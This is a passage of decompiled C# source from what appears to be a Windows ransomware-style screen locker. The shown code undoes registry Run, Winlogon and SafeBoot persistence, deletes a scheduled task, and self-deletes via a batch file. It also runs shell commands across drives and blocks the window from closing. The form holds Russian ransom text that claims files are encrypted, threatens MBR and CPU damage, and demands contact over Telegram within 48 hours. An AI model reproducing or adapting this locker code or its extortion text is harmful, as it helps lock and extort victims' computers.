		}
		try
		{
			RegistryKey[] array = new RegistryKey[3]
			{
				((ServerComputer)Class1.Class0_0).Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true),
				((ServerComputer)Class1.Class0_0).Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", writable: true),
				((ServerComputer)Class1.Class0_0).Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", writable: true)
			};
			try
			{
				array[0].DeleteValue("System32");
			}
			catch
			{
			}
			try
			{
				array[0].DeleteValue("WindowsDefender");
			}
			catch
			{
			}
			try
			{
				array[0].DeleteValue("SystemUpdate");
			}
			catch
			{
			}
			try
			{
				array[1].DeleteValue("System3264Wow");
			}
			catch
			{
			}
			try
			{
				array[2].SetValue("Shell", "explorer.exe");
			}
			catch
			{
			}
			try
			{
				array[2].SetValue("Userinit", "C:\\Windows\\system32\\userinit.exe,");
			}
			catch
			{
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			Class1.MyForms_0.loader.method_14();
		}
		catch
		{
		}
		try
		{
			Class1.MyForms_0.loader.method_16();
		}
		catch
		{
		}
		try
		{
			Class1.MyForms_0.loader.method_17();
		}
		catch
		{
		}
		try
		{
			Class1.MyForms_0.loader.method_18();
		}
		catch
		{
		}
		try
		{
			Class1.MyForms_0.loader.method_21();
		}
		catch
		{
		}
		try
		{
			RegistryKey localMachine = ((ServerComputer)Class1.Class0_0).Registry.LocalMachine;
			RegistryKey registryKey2 = localMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			if (registryKey2 != null)
			{
				try
				{
					registryKey2.DeleteValue("WindowsUpdateService");
				}
				catch
				{
				}
				registryKey2.Close();
			}
			RegistryKey registryKey3 = localMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", writable: true);
			if (registryKey3 != null)
			{
				try
				{
					registryKey3.SetValue("Shell", "explorer.exe");
				}
				catch
				{
				}
				try
				{
					registryKey3.SetValue("Userinit", "C:\\Windows\\system32\\userinit.exe,");
				}
				catch
				{
				}
				registryKey3.Close();
			}
		}
		catch
		{
		}
		try
		{
			RegistryKey localMachine2 = ((ServerComputer)Class1.Class0_0).Registry.LocalMachine;
			string[] array2 = new string[2] { "Minimal", "Network" };
			foreach (string text in array2)
			{
				try
				{
					RegistryKey registryKey4 = localMachine2.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\" + text, writable: true);
					if (registryKey4 != null)
					{
						try
						{
							registryKey4.DeleteSubKeyTree("SystemProtection");
						}
						catch
						{
						}
						registryKey4.Close();
					}
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
		try
		{
			Process.Start(new ProcessStartInfo
			{
				FileName = "schtasks",
				Arguments = "/Delete /TN \"SystemProtection\" /F",
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				UseShellExecute = false
			});
		}
		catch
		{
		}
		try
		{
			Process.Start("explorer.exe");
		}
		catch
		{
		}
		try
		{
			string executablePath = Application.ExecutablePath;
			string text2 = Path.Combine(Path.GetTempPath(), "uninstall.bat");
			string contents = "@echo off\r\ntimeout /t 1 /nobreak >nul\r\ntaskkill /f /im \"" + Path.GetFileName(executablePath) + "\" >nul 2>&1\r\ndel /f /q \"" + executablePath + "\" >nul 2>&1\r\ndel /f /q \"%~f0\" >nul 2>&1";
			File.WriteAllText(text2, contents);
			Process.Start(new ProcessStartInfo
			{
				FileName = text2,
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				UseShellExecute = false
			});
		}
		catch
		{
		}
		Process.GetCurrentProcess().Kill();
	}

	private void method_6()
	{
		checked
		{
			try
			{
				string text = Class1.MyForms_0.loader.string_3.Replace("$", "-") + " & del info-Locker.txt /q /s & attrib +h +s -r desktop.ini";
				string[] array = new string[5] { "%userprofile%\\desktop", "%systemdrive%\\Users\\Public\\Desktop", "%userprofile%\\downloads", "%userprofile%\\documents", "%userprofile%" };
				int num = Class1.MyForms_0.loader.string_0.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					if (Directory.Exists(Class1.MyForms_0.loader.string_0[i] + ":\\"))
					{
						string text2 = Class1.MyForms_0.loader.string_0[i] + ":";
						Interaction.Shell("cmd.exe /c " + text2 + " & " + text, (AppWinStyle)0, false, -1);
					}
				}
				int num2 = array.Length - 1;
				for (int j = 0; j <= num2; j++)
				{
					Interaction.Shell("cmd.exe /c cd \"" + array[j] + "\"&" + text, (AppWinStyle)0, false, -1);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void method_7(object sender, KeyEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Invalid comparison between Unknown and I4
		if ((int)e.KeyCode == 13)
		{
			Label obj = menu1;
			((Control)obj).BackColor = Color.SlateBlue;
			((Control)obj).ForeColor = Color.White;
		}
	}

	public void method_8()
	{
		try
		{
			VB_0024AnonymousDelegate_0 vB_0024AnonymousDelegate_ = delegate
			{
				int num = 0;
				do
				{
					Console.Beep(750, 120);
					num = checked(num + 1);
				}
				while (num <= 1);
			};
			new Thread((vB_0024AnonymousDelegate_ == null) ? null : new ThreadStart(vB_0024AnonymousDelegate_.Invoke)).Start();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void method_9()
	{
		try
		{
			VB_0024AnonymousDelegate_0 vB_0024AnonymousDelegate_ = delegate
			{
				Console.Beep(800, 950);
			};
			new Thread((vB_0024AnonymousDelegate_ != null) ? new ThreadStart(vB_0024AnonymousDelegate_.Invoke) : null).Start();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void method_10()
	{
		try
		{
			VB_0024AnonymousDelegate_0 vB_0024AnonymousDelegate_ = delegate
			{
				Console.Beep(500, 600);
			};
			new Thread((vB_0024AnonymousDelegate_ == null) ? null : new ThreadStart(vB_0024AnonymousDelegate_.Invoke)).Start();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("user32.dll")]
	public static extern int SetForegroundWindow(int int_0);

	private void GForm2_FormClosing(object sender, FormClosingEventArgs e)
	{
		vmethod_8().Start();
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void method_11(object sender, EventArgs e)
	{
		mouse_event(2, 0, 0, 3, 3);
		mouse_event(4, 0, 0, 3, 3);
	}

	private void method_12(object sender, EventArgs e)
	{
		ref object reference = ref object_4;
		reference = Operators.AddObject(reference, (object)1);
		if (Operators.ConditionalCompareObjectEqual(object_4, (object)1, false))
		{
			method_10();
		}
		((Control)ByPassMessage).Visible = true;
		object obj = object_4;
		if (Operators.ConditionalCompareObjectEqual(obj, (object)5, false))
		{
			((Control)ByPassWarnMsg).ForeColor = Color.FromArgb(192, 0, 0);
			((Control)ByPassWarnMsg).BackColor = Color.White;
		}
		else if (Operators.ConditionalCompareObjectEqual(obj, (object)10, false))
		{
			((Control)ByPassWarnMsg).ForeColor = Color.White;
			((Control)ByPassWarnMsg).BackColor = Color.FromArgb(192, 0, 0);
		}
		else if (!Operators.ConditionalCompareObjectEqual(obj, (object)15, false))
		{
			if (Operators.ConditionalCompareObjectEqual(obj, (object)20, false))
			{
				((Control)ByPassWarnMsg).ForeColor = Color.White;
				((Control)ByPassWarnMsg).BackColor = Color.FromArgb(192, 0, 0);
			}
			else if (Operators.ConditionalCompareObjectEqual(obj, (object)100, false))
			{
				((Control)ByPassMessage).Visible = false;
				vmethod_8().Stop();
				object_4 = 0;
			}
		}
		else
		{
			((Control)ByPassWarnMsg).ForeColor = Color.FromArgb(192, 0, 0);
			((Control)ByPassWarnMsg).BackColor = Color.White;
		}
	}

	private void method_13(object sender, EventArgs e)
	{
	}

	private void method_14(object sender, EventArgs e)
	{
	}

	private void method_15(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && container_0 != null)
			{
				((IDisposable)container_0).Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	private void method_16()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Expected O, but got Unknown
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ec: Expected O, but got Unknown
		//IL_00ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f7: Expected O, but got Unknown
		//IL_00f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0102: Expected O, but got Unknown
		//IL_0103: Unknown result type (might be due to invalid IL or missing references)
		//IL_010d: Expected O, but got Unknown
		//IL_010e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0118: Expected O, but got Unknown
		//IL_0119: Unknown result type (might be due to invalid IL or missing references)
		//IL_0123: Expected O, but got Unknown
		//IL_0124: Unknown result type (might be due to invalid IL or missing references)
		//IL_012e: Expected O, but got Unknown
		//IL_012f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0139: Expected O, but got Unknown
		//IL_013a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0144: Expected O, but got Unknown
		//IL_0145: Unknown result type (might be due to invalid IL or missing references)
		//IL_014f: Expected O, but got Unknown
		//IL_0150: Unknown result type (might be due to invalid IL or missing references)
		//IL_015a: Expected O, but got Unknown
		//IL_015b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0165: Expected O, but got Unknown
		//IL_0166: Unknown result type (might be due to invalid IL or missing references)
		//IL_0170: Expected O, but got Unknown
		//IL_0177: Unknown result type (might be due to invalid IL or missing references)
		//IL_0181: Expected O, but got Unknown
		//IL_0188: Unknown result type (might be due to invalid IL or missing references)
		//IL_0192: Expected O, but got Unknown
		//IL_0193: Unknown result type (might be due to invalid IL or missing references)
		//IL_019d: Expected O, but got Unknown
		//IL_01a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ae: Expected O, but got Unknown
		//IL_01b5: Unknown result type (might be due to invalid IL or missing references)
		//IL_01bf: Expected O, but got Unknown
		//IL_01c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d0: Expected O, but got Unknown
		//IL_02b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_02bd: Expected O, but got Unknown
		//IL_0405: Unknown result type (might be due to invalid IL or missing references)
		//IL_040f: Expected O, but got Unknown
		//IL_047f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0489: Expected O, but got Unknown
		//IL_051e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0528: Expected O, but got Unknown
		//IL_05c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_05d2: Expected O, but got Unknown
		//IL_0885: Unknown result type (might be due to invalid IL or missing references)
		//IL_088f: Expected O, but got Unknown
		//IL_098e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0998: Expected O, but got Unknown
		//IL_0a7d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a87: Expected O, but got Unknown
		//IL_0d2a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d34: Expected O, but got Unknown
		//IL_0eac: Unknown result type (might be due to invalid IL or missing references)
		//IL_0eb6: Expected O, but got Unknown
		//IL_0f5d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f67: Expected O, but got Unknown
		//IL_100e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1018: Expected O, but got Unknown
		//IL_10f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_1103: Expected O, but got Unknown
		//IL_1247: Unknown result type (might be due to invalid IL or missing references)
		//IL_1251: Expected O, but got Unknown
		//IL_12c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_12d1: Expected O, but got Unknown
		//IL_155d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1567: Expected O, but got Unknown
		//IL_15ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_15f4: Expected O, but got Unknown
		//IL_16f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_1703: Expected O, but got Unknown
		//IL_1714: Unknown result type (might be due to invalid IL or missing references)
		//IL_171e: Expected O, but got Unknown
		//IL_184a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1854: Expected O, but got Unknown
		container_0 = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(GForm2));
		g1 = new Label();
		a1 = new Panel();
		s2 = new Label();
		tg = new Label();
		s1 = new Label();
		border_6 = new PictureBox();
		border_5 = new PictureBox();
		border_2 = new PictureBox();
		border_1 = new PictureBox();
		main = new Panel();
		ByPassMessage = new Panel();
		c3 = new PictureBox();
		c2 = new PictureBox();
		c4 = new PictureBox();
		c1 = new PictureBox();
		ByPassWarnMsg = new Label();
		Safe1 = new PictureBox();
		Safe2 = new PictureBox();
		ID = new Label();
		UserInfo = new Label();
		Title = new Label();
		menu1 = new Label();
		a2 = new Panel();
		errx = new Label();
		border_8 = new PictureBox();
		border_7 = new PictureBox();
		border_4 = new PictureBox();
		border_3 = new PictureBox();
		inputPS = new Label();
		keytext = new Label();
		hdn = new TextBox();
		vmethod_1(new Timer((IContainer)container_0));
		vmethod_3(new Timer((IContainer)container_0));
		art = new Label();
		vmethod_5(new Timer((IContainer)container_0));
		vmethod_7(new Timer((IContainer)container_0));
		vmethod_9(new Timer((IContainer)container_0));
		((Control)a1).SuspendLayout();
		((ISupportInitialize)border_6).BeginInit();
		((ISupportInitialize)border_5).BeginInit();
		((ISupportInitialize)border_2).BeginInit();
		((ISupportInitialize)border_1).BeginInit();
		((Control)main).SuspendLayout();
		((Control)ByPassMessage).SuspendLayout();
		((ISupportInitialize)c3).BeginInit();
		((ISupportInitialize)c2).BeginInit();
		((ISupportInitialize)c4).BeginInit();
		((ISupportInitialize)c1).BeginInit();
		((ISupportInitialize)Safe1).BeginInit();
		((ISupportInitialize)Safe2).BeginInit();
		((Control)a2).SuspendLayout();
		((ISupportInitialize)border_8).BeginInit();
		((ISupportInitialize)border_7).BeginInit();
		((ISupportInitialize)border_4).BeginInit();
		((ISupportInitialize)border_3).BeginInit();
		((Control)this).SuspendLayout();
		((Control)g1).Font = new Font("Lucida Console", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)204);
		((Control)g1).ForeColor = Color.White;
		((Control)g1).Location = new Point(6, 1);
		((Control)g1).Name = "g1";
		((Control)g1).Size = new Size(807, 153);
		((Control)g1).TabIndex = 0;
		((Control)g1).Text = "Упс! Вы подверглись масштабной хакерской атаке и теперь Ваш компьютер заблокирован, а все имеющиеся диски и файлы на них зашифрованы хакерской группировкой. Любые действия, связанные с попыткой обмануть систему нанесут непоправимый вред Вашему компьютеру и приведут к потере всех важных файлов без возможности восстановления. При попытке снять блокировку MBR ( главный загрузчик материнки) будет снесён и будет подана рекурсивная нагрузка на ваш процессор, что приведёт к его неисправности. У вас есть 48 часов с момента запуска чтобы ввести код";
		g1.TextAlign = (ContentAlignment)16;
		((Control)a1).Anchor = (AnchorStyles)0;
		((Control)a1).Controls.Add((Control)(object)s2);
		((Control)a1).Controls.Add((Control)(object)tg);
		((Control)a1).Controls.Add((Control)(object)s1);
		((Control)a1).Controls.Add((Control)(object)border_6);
		((Control)a1).Controls.Add((Control)(object)border_5);
		((Control)a1).Controls.Add((Control)(object)border_2);
		((Control)a1).Controls.Add((Control)(object)border_1);
		((Control)a1).Controls.Add((Control)(object)g1);
		((Control)a1).Font = new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)204);
		((Control)a1).Location = new Point(97, 147);
		((Control)a1).Name = "a1";
		((Control)a1).Size = new Size(813, 178);
		((Control)a1).TabIndex = 2;
		((Control)a1).Visible = false;
		((Control)s2).Font = new Font("Lucida Console", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204);
		((Control)s2).ForeColor = Color.WhiteSmoke;
		((Control)s2).Location = new Point(647, 154);
		((Control)s2).Name = "s2";
		((Control)s2).Size = new Size(140, 23);
		((Control)s2).TabIndex = 12;
		((Control)s2).Text = "(Telegram)";
		((Control)tg).BackColor = Color.Transparent;
		((Control)tg).Font = new Font("Lucida Console", 15.75f, (FontStyle)4, (GraphicsUnit)3, (byte)204);
		((Control)tg).ForeColor = Color.FromArgb(255, 255, 192);
		((Control)tg).Location = new Point(411, 154);
		((Control)tg).Name = "tg";
		((Control)tg).Size = new Size(234, 23);
		((Control)tg).TabIndex = 11;
		((Control)tg).Text = "@sex";
		tg.TextAlign = (ContentAlignment)2;
		((Control)s1).Font = new Font("Lucida Console", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204);
		((Control)s1).ForeColor = Color.WhiteSmoke;
		((Control)s1).Location = new Point(10, 151);
		((Control)s1).Name = "s1";
		((Control)s1).Size = new Size(395, 23);
		((Control)s1).TabIndex = 10;
		((Control)s1).Text = "Что бы получить код, напиши";
		((Control)border_6).BackColor = Color.FromArgb(150, 255, 195);
		((Control)border_6).Dock = (DockStyle)4;
		((Control)border_6).Location = new Point(811, 1);
		((Control)border_6).Name = "border_6";
		((Control)border_6).Size = new Size(2, 176);
		border_6.TabIndex = 9;
		border_6.TabStop = false;
		((Control)border_5).BackColor = Color.FromArgb(150, 255, 195);
		((Control)border_5).Dock = (DockStyle)3;
		((Control)border_5).Location = new Point(0, 1);
		((Control)border_5).Name = "border_5";
		((Control)border_5).Size = new Size(2, 176);
		border_5.TabIndex = 8;
		border_5.TabStop = false;
		((Control)border_2).BackColor = Color.FromArgb(150, 255, 195);
		((Control)border_2).Dock = (DockStyle)2;
		((Control)border_2).Location = new Point(0, 177);
		((Control)border_2).Name = "border_2";
		((Control)border_2).Size = new Size(813, 1);
		border_2.TabIndex = 7;
		border_2.TabStop = false;
		((Control)border_1).BackColor = Color.FromArgb(150, 255, 195);
		((Control)border_1).Dock = (DockStyle)1;
		((Control)border_1).Location = new Point(0, 0);
		((Control)border_1).Name = "border_1";
		((Control)border_1).Size = new Size(813, 1);
		border_1.TabIndex = 6;
		border_1.TabStop = false;
		string text = "Blue";
		if (Operators.CompareString(text, "WhiteBlueRed", false) != 0 && Operators.CompareString(text, "YellowBlue", false) != 0)
		{
			((Control)main).BackColor = method_17(text);
		}
		else
		{
			((Control)main).BackColor = Color.Transparent;
		}
		((Control)main).Paint += new PaintEventHandler(method_19);
		((Control)main).Controls.Add((Control)(object)ByPassMessage);
		((Control)main).Controls.Add((Control)(object)Safe1);
		((Control)main).Controls.Add((Control)(object)Safe2);
		((Control)main).Controls.Add((Control)(object)ID);
		((Control)main).Controls.Add((Control)(object)UserInfo);
		((Control)main).Controls.Add((Control)(object)Title);
		((Control)main).Controls.Add((Control)(object)menu1);
		((Control)main).Controls.Add((Control)(object)a2);
		((Control)main).Controls.Add((Control)(object)hdn);
		((Control)main).Controls.Add((Control)(object)a1);
		((Control)main).Dock = (DockStyle)5;
		((Control)main).Font = new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204);
		((Control)main).Location = new Point(0, 0);
		((Control)main).Name = "main";
		((Control)main).Size = new Size(1006, 540);
		((Control)main).TabIndex = 1;
		((Control)main).Visible = false;
		((Control)ByPassMessage).Anchor = (AnchorStyles)0;
		((Control)ByPassMessage).Controls.Add((Control)(object)c3);
		((Control)ByPassMessage).Controls.Add((Control)(object)c2);
		((Control)ByPassMessage).Controls.Add((Control)(object)c4);
		((Control)ByPassMessage).Controls.Add((Control)(object)c1);
		((Control)ByPassMessage).Controls.Add((Control)(object)ByPassWarnMsg);
		((Control)ByPassMessage).Font = new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)204);
		((Control)ByPassMessage).ForeColor = Color.FromArgb(192, 0, 0);
		((Control)ByPassMessage).Location = new Point(324, 208);
		((Control)ByPassMessage).Name = "ByPassMessage";
		((Control)ByPassMessage).Size = new Size(373, 178);
		((Control)ByPassMessage).TabIndex = 18;
		((Control)ByPassMessage).Visible = false;
		((Control)c3).BackColor = Color.FromArgb(150, 255, 195);
		((Control)c3).Dock = (DockStyle)4;
		((Control)c3).Location = new Point(371, 1);
		((Control)c3).Name = "c3";
		((Control)c3).Size = new Size(2, 176);
		c3.TabIndex = 9;
		c3.TabStop = false;
		((Control)c2).BackColor = Color.FromArgb(150, 255, 195);
		((Control)c2).Dock = (DockStyle)3;
		((Control)c2).Location = new Point(0, 1);
		((Control)c2).Name = "c2";
		((Control)c2).Size = new Size(2, 176);
		c2.TabIndex = 8;
		c2.TabStop = false;
		((Control)c4).BackColor = Color.FromArgb(150, 255, 195);
		((Control)c4).Dock = (DockStyle)2;
		((Control)c4).Location = new Point(0, 177);
		((Control)c4).Name = "c4";
		((Control)c4).Size = new Size(373, 1);
		c4.TabIndex = 7;
		c4.TabStop = false;
		((Control)c1).BackColor = Color.FromArgb(150, 255, 195);
		((Control)c1).Dock = (DockStyle)1;
		((Control)c1).Location = new Point(0, 0);
		((Control)c1).Name = "c1";
		((Control)c1).Size = new Size(373, 1);
		c1.TabIndex = 6;
		c1.TabStop = false;
		((Control)ByPassWarnMsg).BackColor = Color.FromArgb(192, 0, 0);
		((Control)ByPassWarnMsg).Dock = (DockStyle)5;
		((Control)ByPassWarnMsg).Font = new Font("Lucida Console", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)204);
		((Control)ByPassWarnMsg).ForeColor = Color.White;
		((Control)ByPassWarnMsg).Location = new Point(0, 0);
		((Control)ByPassWarnMsg).Name = "ByPassWarnMsg";
		((Control)ByPassWarnMsg).Size = new Size(373, 178);
		((Control)ByPassWarnMsg).TabIndex = 0;
		((Control)ByPassWarnMsg).Text = "Замечена и остановлена попытка обмануть систему!";
		ByPassWarnMsg.TextAlign = (ContentAlignment)32;
		((Control)Safe1).BackColor = Color.Black;
		((Control)Safe1).Dock = (DockStyle)3;
		((Control)Safe1).Location = new Point(0, 0);
		((Control)Safe1).Name = "Safe1";
		((Control)Safe1).Size = new Size(70, 540);
		Safe1.TabIndex = 14;
		Safe1.TabStop = false;
		((Control)Safe2).BackColor = Color.Black;
		((Control)Safe2).Dock = (DockStyle)4;
		((Control)Safe2).Location = new Point(936, 0);
		((Control)Safe2).Name = "Safe2";
		((Control)Safe2).Size = new Size(70, 540);
		Safe2.TabIndex = 15;
		Safe2.TabStop = false;
		((Control)ID).Anchor = (AnchorStyles)6;
		((Control)ID).Font = new Font("MS Gothic", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)204);
		((Control)ID).ForeColor = Color.White;
		((Control)ID).Location = new Point(74, 517);
		((Control)ID).Name = "ID";
		((Control)ID).Size = new Size(856, 23);
		((Control)ID).TabIndex = 17;
		((Control)ID).Text = "ID: Ошибка идентификации";
		ID.TextAlign = (ContentAlignment)16;
		((Control)ID).Visible = false;
		((Control)UserInfo).Anchor = (AnchorStyles)0;
		((Control)UserInfo).Font = new Font("Lucida Console", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)204);
		((Control)UserInfo).ForeColor = Color.Silver;
		((Control)UserInfo).Location = new Point(97, 427);
		((Control)UserInfo).Name = "UserInfo";
		((Control)UserInfo).Size = new Size(645, 23);
		((Control)UserInfo).TabIndex = 16;
		UserInfo.TextAlign = (ContentAlignment)16;
		((Control)UserInfo).Visible = false;
		((Control)Title).Anchor = (AnchorStyles)0;
		((Control)Title).BackColor = Color.White;
		((Control)Title).Font = new Font("Lucida Console", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)204);
		((Control)Title).ForeColor = Color.Black;
		((Control)Title).Location = new Point(332, 119);
		((Control)Title).Name = "Title";
		((Control)Title).Size = new Size(342, 23);
		((Control)Title).TabIndex = 13;
		((Control)Title).Text = "Ваши файлы зашифрованы!";
		Title.TextAlign = (ContentAlignment)32;
		((Control)menu1).Anchor = (AnchorStyles)0;
		string text2 = "Blue";
		if (Operators.CompareString(text2, "WhiteBlueRed", false) != 0 && Operators.CompareString(text2, "YellowBlue", false) != 0)
		{
			((Control)menu1).BackColor = method_17(text2);
		}
		else
		{
			((Control)menu1).BackColor = Color.Transparent;
		}
		((Control)menu1).Font = new Font("Lucida Console", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204);
		((Control)menu1).ForeColor = Color.White;
		((Control)menu1).Location = new Point(744, 427);
		((Control)menu1).Name = "menu1";
		((Control)menu1).Size = new Size(166, 23);
		((Control)menu1).TabIndex = 12;
		((Control)menu1).Text = "Enter [Ввод]";
		menu1.TextAlign = (ContentAlignment)32;
		((Control)menu1).Visible = false;
		((Control)a2).Anchor = (AnchorStyles)0;
		((Control)a2).Controls.Add((Control)(object)errx);
		((Control)a2).Controls.Add((Control)(object)border_8);
		((Control)a2).Controls.Add((Control)(object)border_7);
		((Control)a2).Controls.Add((Control)(object)border_4);
		((Control)a2).Controls.Add((Control)(object)border_3);
		((Control)a2).Controls.Add((Control)(object)inputPS);
		((Control)a2).Controls.Add((Control)(object)keytext);
		((Control)a2).Font = new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)204);
		((Control)a2).Location = new Point(97, 330);
		((Control)a2).Name = "a2";
		((Control)a2).Size = new Size(813, 94);
		((Control)a2).TabIndex = 5;
		((Control)a2).Visible = false;
		((Control)errx).BackColor = Color.Transparent;
		((Control)errx).Font = new Font("Lucida Console", 15.75f);
		((Control)errx).ForeColor = Color.MistyRose;
		((Control)errx).Location = new Point(3, 62);
		((Control)errx).Name = "errx";
		((Control)errx).Size = new Size(807, 24);
		((Control)errx).TabIndex = 11;
		((Control)errx).Text = "Ошибка! Введённый код не совпадает с ключом разблокировки.";
		errx.TextAlign = (ContentAlignment)2;
		((Control)errx).Visible = false;
		((Control)border_8).BackColor = Color.FromArgb(150, 255, 195);
		((Control)border_8).Dock = (DockStyle)4;
		((Control)border_8).Location = new Point(811, 1);
		((Control)border_8).Name = "border_8";
		((Control)border_8).Size = new Size(2, 92);
		border_8.TabIndex = 10;
		border_8.TabStop = false;
		((Control)border_7).BackColor = Color.FromArgb(150, 255, 195);
		((Control)border_7).Dock = (DockStyle)3;
		((Control)border_7).Location = new Point(0, 1);
		((Control)border_7).Name = "border_7";
		((Control)border_7).Size = new Size(2, 92);
		border_7.TabIndex = 9;
		border_7.TabStop = false;
		((Control)border_4).BackColor = Color.FromArgb(150, 255, 195);
		((Control)border_4).Dock = (DockStyle)2;
		((Control)border_4).Location = new Point(0, 93);
		((Control)border_4).Name = "border_4";
		((Control)border_4).Size = new Size(813, 1);
		border_4.TabIndex = 8;
		border_4.TabStop = false;
		((Control)border_3).BackColor = Color.FromArgb(150, 255, 195);
		((Control)border_3).Dock = (DockStyle)1;
		((Control)border_3).Location = new Point(0, 0);
		((Control)border_3).Name = "border_3";
		((Control)border_3).Size = new Size(813, 1);
		border_3.TabIndex = 7;
		border_3.TabStop = false;
		((Control)inputPS).BackColor = Color.White;
		((Control)inputPS).Font = new Font("Lucida Console", 15.75f);
		((Control)inputPS).ForeColor = Color.Black;
		((Control)inputPS).Location = new Point(8, 29);
		((Control)inputPS).Name = "inputPS";
		((Control)inputPS).Size = new Size(797, 25);
		((Control)inputPS).TabIndex = 5;
		((Control)inputPS).Text = " ";
		inputPS.TextAlign = (ContentAlignment)32;
		((Control)keytext).Font = new Font("Lucida Console", 15.75f);
		((Control)keytext).Location = new Point(3, 6);
		((Control)keytext).Name = "keytext";
		((Control)keytext).Size = new Size(807, 24);
		((Control)keytext).TabIndex = 4;
		((Control)keytext).Text = "Введите код разблокировки:";
		keytext.TextAlign = (ContentAlignment)2;
		((Control)hdn).Location = new Point(-17, 4);
		((TextBoxBase)hdn).MaxLength = 45;
		((Control)hdn).Name = "hdn";
		((Control)hdn).Size = new Size(10, 22);
		((Control)hdn).TabIndex = 3;
		vmethod_0().Enabled = true;
